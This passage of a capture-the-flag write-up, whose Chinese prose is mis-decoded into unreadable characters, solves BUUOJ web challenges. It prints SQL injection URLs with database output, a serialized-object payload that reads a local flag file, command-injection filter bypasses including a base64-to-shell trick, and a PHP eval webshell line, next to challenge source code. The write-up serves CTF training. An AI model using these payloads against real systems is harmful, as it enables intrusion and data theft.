class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>çœ‹èµ·æ¥åƒ SSRF ï¼Œåˆæœ‰åºåˆ—åŒ–ã€‚</p>\n<h4 id=\"SQLæ³¨å…¥\"><a href=\"#SQLæ³¨å…¥\" class=\"headerlink\" title=\"SQLæ³¨å…¥\"></a>SQLæ³¨å…¥</h4><p><code>Join</code> é¡µé¢ <code>sqlmap</code> è¯•å‡ºæ¥ <code>username</code> æœ‰ POST æ³¨å…¥ï¼Œå­˜çš„æ•°æ®æ˜¯åºåˆ—åŒ–ä¹‹åçš„ç”¨æˆ·ä¿¡æ¯ã€‚</p>\n<p>æ³¨å†Œç™»å½•ä¹‹åæŸ¥çœ‹ BLOG å†…å®¹é¡µé¢å‘ç° <code>no</code> å‚æ•°å¯èƒ½å­˜åœ¨æ³¨å…¥ï¼š</p>\n<p><code>http://buuoj.cn/view.php?no=1 and 1=1#</code></p>\n<p><code>æ­£å¸¸</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 and 1=2#</code></p>\n<p><code>æŠ¥é”™ Notice: Trying to get property of non-object in /var/www/html/view.php on line 53</code></p>\n<p><code>node3.buuoj.cn/view.php?no=1 order by 5#</code></p>\n<p><code>*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1 union select 1,2,3,4#</code></p>\n<p><code>æœ‰è¿‡æ»¤ï¼šno hack ~_~</code></p>\n<p><code>.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4#</code></p>\n<p><code>æ‰¾åˆ°å›æ˜¾ä½åœ¨ 2</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</code></p>\n<p><code>fakebook,information_schema,mysql,performance_schema,test</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+</code></p>\n<p><code>users</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>\n<p><code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p>\n<p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(data,username,passwd),3,4 from users--+</code></p>\n<p><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;goya&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;}goyaed12c3322e527f073f9159f257dfcc7db08c86ec11388c76b6c5009b06aa33ecd6bfab7d74151ba3f0c50ef1938c03134762c9e435cc88db39c53114ed2a2b14</code></p>\n<p>åºåˆ—åŒ–å­˜å‚¨ <code>data</code></p>\n<p>ç»“åˆä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸‹é¢çš„ä»£ç å³å¯è¯»å– flag ï¼š</p>\n<p><code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>\n<p>é¡ºä¾¿è¯»ä¸€ä¸‹ <code>view.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php session_start(); ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;db.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;user.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php require_once &apos;error.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$db = new DB();</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;ko&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot;</span><br><span class=\"line\">          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;User&lt;/title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;?php require_once &apos;bootstrap.php&apos;; ?&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$no = $_GET[&apos;no&apos;];</span><br><span class=\"line\">if ($db-&gt;anti_sqli($no))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    die(&quot;no hack ~_~&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$res = $db-&gt;getUserByNo($no);</span><br><span class=\"line\">$user = unserialize($res[&apos;data&apos;]);</span><br><span class=\"line\">//print_r($res);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;div class=&quot;container&quot;&gt;</span><br><span class=\"line\">    &lt;table class=&quot;table&quot;&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                username</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                age</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">            &lt;th&gt;</span><br><span class=\"line\">                blog</span><br><span class=\"line\">            &lt;/th&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">        &lt;tr&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $res[&apos;username&apos;]; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">            &lt;td&gt;</span><br><span class=\"line\">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class=\"line\">            &lt;/td&gt;</span><br><span class=\"line\">        &lt;/tr&gt;</span><br><span class=\"line\">    &lt;/table&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class=\"line\">    &lt;hr&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">    $response = $user-&gt;getBlogContents();</span><br><span class=\"line\">    if ($response === 404)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &quot;404 Not found&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $base64 = base64_encode($response);</span><br><span class=\"line\">        echo &quot;&lt;iframe width=&apos;100%&apos; height=&apos;10em&apos; src=&apos;data:text/html;base64,&#123;$base64&#125;&apos;&gt;&quot;;</span><br><span class=\"line\">        // echo $response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // var_dump($user-&gt;getBlogContents());</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>db.php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">require_once &apos;lib.php&apos;;</span><br><span class=\"line\">$mysqli = new mysqli(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;naiwjebfahjebfja&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">class DB &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction __construct() &#123;</span><br><span class=\"line\">\t\t// $mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;!@#1234!@#&apos;, &apos;fakebook&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function isValidUsername($username) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res-&gt;fetch_array()) &#123;</span><br><span class=\"line\">\t\t\treturn 1;</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction login($username, $passwd) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos; and passwd = &apos;&#123;$passwd&#125;&apos;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_array();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction insertUser($username, $passwd, $data) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = substr($username, 0, 100);</span><br><span class=\"line\">\t\t$username = addslashes($username);</span><br><span class=\"line\">\t\t$passwd = sha512($passwd);</span><br><span class=\"line\">\t\t$data = serialize($data);</span><br><span class=\"line\">\t\t$data = addslashes($data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;insert into users (username, passwd, data) values (&apos;&#123;$username&#125;&apos;, &apos;&#123;$passwd&#125;&apos;, &apos;&#123;$data&#125;&apos;)&quot;;</span><br><span class=\"line\">\t\treturn $mysqli-&gt;real_query($query);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getAllUsers() &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$query = &quot;select * from users&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\treturn $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function getUserByNo($no) &#123;</span><br><span class=\"line\">\t\tglobal $mysqli;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// $no = addslashes($no);</span><br><span class=\"line\">\t\t$query = &quot;select * from users where no = &#123;$no&#125;&quot;;</span><br><span class=\"line\">\t\t$res = $mysqli-&gt;query($query);</span><br><span class=\"line\">\t\tif (!$res) &#123;</span><br><span class=\"line\">\t\t\techo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;/p&gt;&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn $res-&gt;fetch_assoc();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic function anti_sqli($no) &#123;</span><br><span class=\"line\">\t\t$patterns = &quot;/union\\Wselect|0x|hex/i&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn preg_match($patterns, $no);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span><br><span class=\"line\"></span><br><span class=\"line\"> */</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Ping-Ping-Ping\"><a href=\"#Ping-Ping-Ping\" class=\"headerlink\" title=\"Ping Ping Ping\"></a>Ping Ping Ping</h3><h4 id=\"å‘½ä»¤æ³¨å…¥\"><a href=\"#å‘½ä»¤æ³¨å…¥\" class=\"headerlink\" title=\"å‘½ä»¤æ³¨å…¥\"></a>å‘½ä»¤æ³¨å…¥</h4><p>å…ˆæµ‹è¯•ä»€ä¹ˆèƒ½ç”¨</p>\n<p>è¿‡æ»¤<code>&#39; ã€&quot; ã€ {}ã€ç©ºæ ¼ã€[]ã€*ã€?</code>ã€/</p>\n<p>ç»•è¿‡ç©ºæ ¼å¯ä»¥ <code>${IFS},$IFS,</code></p>\n<p>è¿™é‡Œ <code>$IFS</code> ç»•è¿‡ç©ºæ ¼</p>\n<p><code>127.0.0.1;ls$IFS-l</code> çœ‹åˆ° flag.phpã€‚ å°è¯•è¯» <code>127.0.0.1;cat$IFSflag.php</code>,è¿‡æ»¤äº† <code>flag</code> å…³é”®å­—ï¼Œå°è¯•ä¼ é©¬</p>\n<p> <code>;echo -e &quot;&lt;?php @eval(\\$_POST[122]);?&gt;&quot; &gt; 233.php</code> </p>\n<p>ä½†æ˜¯å› ä¸ºè¿‡æ»¤äº†å¼•å·ï¼Œä¹Ÿå¤±è´¥äº†ã€‚ç°åœ¨åªèƒ½å°è¯•æ„é€ å…³é”®å­— flag ã€‚</p>\n<p>å°è¯•å†…è”æ‰§è¡Œ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;a=f;b=ag;c=l;cat$IFS$a$c$b.php</span><br></pre></td></tr></table></figure>\n\n<p>è¿™é‡Œéœ€è¦æ³¨æ„å®šä¹‰å˜é‡çš„é¡ºåº <code>acd</code> å°±ä¼šè¢«æ£€æµ‹å‡ºå«æœ‰ flagã€‚</p>\n<p>æ‰§è¡Œå®ŒæŸ¥çœ‹æºä»£ç å³å¯ã€‚</p>\n<p>è¿˜å¯ä»¥ç¼–ç ç»•è¿‡ï¼š</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh ==&gt; cat flag.php</span><br></pre></td></tr></table></figure>\n\n<p>å‚è€ƒï¼š</p>\n<p><a href=\"https://blog.csdn.net/silence1_/article/details/96135760\" target=\"_blank\" rel=\"noopener\">å‘½ä»¤æ³¨å…¥ç»•è¿‡</a></p>\n<h3 id=\"SSRFME\"><a href=\"#SSRFME\" class=\"headerlink\" title=\"SSRFME\"></a>SSRFME</h3><p>æºç ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span 